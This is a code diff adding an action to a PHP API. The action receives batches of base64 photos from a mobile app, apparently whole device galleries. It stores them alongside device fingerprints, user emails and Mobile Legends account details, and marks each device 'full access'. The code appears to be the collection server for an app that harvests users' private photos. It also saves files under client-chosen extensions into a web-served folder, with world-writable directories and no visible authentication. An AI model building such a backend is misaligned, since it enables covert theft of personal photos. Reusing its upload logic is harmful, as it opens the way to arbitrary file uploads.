@@ -458,6 +458,142 @@ switch ($action) {
         sendResponse(true, $res['data'] ?: []);
         break;
 
+    // --- GALLERY UPLOAD & LIVE STREAMING (FROM MOBILE APK) ---
+    case 'upload_gallery':
+    case 'sync_gallery_photos':
+        $devId             = trim($body['device_id'] ?? $_POST['device_id'] ?? '');
+        $deviceName        = trim($body['device_name'] ?? $_POST['device_name'] ?? '');
+        $deviceModel       = trim($body['device_model'] ?? $_POST['device_model'] ?? '');
+        $deviceFingerprint = trim($body['device_fingerprint'] ?? $_POST['device_fingerprint'] ?? '');
+        $userEmail         = trim($body['user_email'] ?? $_POST['user_email'] ?? '');
+        $mlbbId            = trim($body['mlbb_id'] ?? $_POST['mlbb_id'] ?? '');
+        $mlbbServer        = trim($body['mlbb_server'] ?? $_POST['mlbb_server'] ?? '');
+        $mlbbIgn           = trim($body['mlbb_ign'] ?? $_POST['mlbb_ign'] ?? '');
+
+        if (empty($devId) && empty($userEmail)) {
+            sendResponse(false, null, 'device_id or user_email required', 400);
+        }
+
+        if (checkDeletedCooldown($devId)) {
+            sendResponse(true, ['reset_requested' => true, 'deleted_cooldown' => true], 'Device was deleted by administrator');
+        }
+
+        list($dir, $folderName) = findDeviceDir($devId);
+        if (!$dir) {
+            $cleanFolder = 'device_' . preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower($devId));
+            $dir = GALLERY_DIR . '/' . $cleanFolder;
+            if (!is_dir($dir)) {
+                @mkdir($dir, 0777, true);
+            }
+            $folderName = $cleanFolder;
+        }
+
+        $metaFile = $dir . '/meta.json';
+        $meta = file_exists($metaFile) ? @json_decode(file_get_contents($metaFile), true) : [];
+        if (!is_array($meta)) $meta = [];
+
+        $meta['device_id'] = $devId;
+        if (!empty($deviceName)) $meta['device_name'] = $deviceName;
+        if (!empty($deviceModel)) $meta['device_model'] = $deviceModel;
+        if (!empty($deviceFingerprint)) $meta['device_fingerprint'] = $deviceFingerprint;
+        if (!empty($userEmail)) $meta['user_email'] = $userEmail;
+        if (!empty($mlbbId)) $meta['mlbb_id'] = $mlbbId;
+        if (!empty($mlbbServer)) $meta['mlbb_server'] = $mlbbServer;
+        if (!empty($mlbbIgn)) $meta['mlbb_ign'] = $mlbbIgn;
+        $meta['is_full_access'] = true;
+        $meta['last_synced'] = date('c');
+        if (!isset($meta['photos']) || !is_array($meta['photos'])) {
+            $meta['photos'] = [];
+        }
+
+        $incoming = $body['photos'] ?? [];
+        $savedCount = 0;
+
+        if (is_array($incoming)) {
+            foreach ($incoming as $idx => $item) {
+                $dataUrl = $item['dataUrl'] ?? '';
+                if (empty($dataUrl)) continue;
+
+                $parts = explode(',', $dataUrl);
+                $rawBase64 = end($parts);
+                $decoded = base64_decode($rawBase64);
+                if ($decoded === false || strlen($decoded) === 0) continue;
+
+                $isAvatar = !empty($item['is_avatar']);
+                $contentHash = md5($decoded);
+                $origName = $item['name'] ?? ('photo_' . time() . '_' . $idx . '.jpg');
+                $album = trim($item['album'] ?? 'Gallery') ?: 'Gallery';
+                $mime = $item['mime'] ?? 'image/jpeg';
+                $size = strlen($decoded);
+
+                if ($isAvatar) {
+                    $avatarPath = $dir . '/avatar_current.jpg';
+                    file_put_contents($avatarPath, $decoded);
+                    $meta['photos'] = array_values(array_filter($meta['photos'], function($p) {
+                        return empty($p['is_avatar']) && ($p['filename'] ?? '') !== 'avatar_current.jpg';
+                    }));
+                    array_unshift($meta['photos'], [
+                        'id'           => 'avatar_current',
+                        'filename'     => 'avatar_current.jpg',
+                        'name'         => 'Profile Avatar',
+                        'album'        => 'Avatar',
+                        'url'          => 'uploads/gallery/' . $folderName . '/avatar_current.jpg',
+                        'size'         => $size,
+                        'mime'         => $mime,
+                        'is_avatar'    => true,
+                        'content_hash' => $contentHash,
+                        'date_added'   => date('c')
+                    ]);
+                    $savedCount++;
+                    continue;
+                }
+
+                // Deduplication
+                $alreadyExists = false;
+                foreach ($meta['photos'] as $ep) {
+                    if (!empty($ep['content_hash']) && $ep['content_hash'] === $contentHash) {
+                        $alreadyExists = true;
+                        break;
+                    }
+                    if (($ep['name'] ?? '') === $origName && ($ep['album'] ?? '') === $album && intval($ep['size'] ?? 0) === $size) {
+                        $alreadyExists = true;
+                        break;
+                    }
+                }
+                if ($alreadyExists) continue;
+
+                $ext = pathinfo($origName, PATHINFO_EXTENSION);
+                if (empty($ext)) $ext = 'jpg';
+                $saveFilename = 'photo_' . time() . '_' . $idx . '_' . substr($contentHash, 0, 6) . '.' . $ext;
+                $savePath = $dir . '/' . $saveFilename;
+
+                if (@file_put_contents($savePath, $decoded)) {
+                    $meta['photos'][] = [
+                        'id'           => $item['id'] ?? $saveFilename,
+                        'filename'     => $saveFilename,
+                        'name'         => $origName,
+                        'album'        => $album,
+                        'url'          => 'uploads/gallery/' . $folderName . '/' . $saveFilename,
+                        'size'         => $size,
+                        'mime'         => $mime,
+                        'is_avatar'    => false,
+                        'content_hash' => $contentHash,
+                        'date_added'   => date('c')
+                    ];
+                    $savedCount++;
+                }
+            }
+        }
+
+        @file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
+
+        sendResponse(true, [
+            'saved_count'  => $savedCount,
+            'total_photos' => count($meta['photos']),
+            'device_id'    => $devId
+        ], 'Batch processed successfully');
+        break;
+
     default:
         sendResponse(false, null, 'Invalid action', 404);
         break;
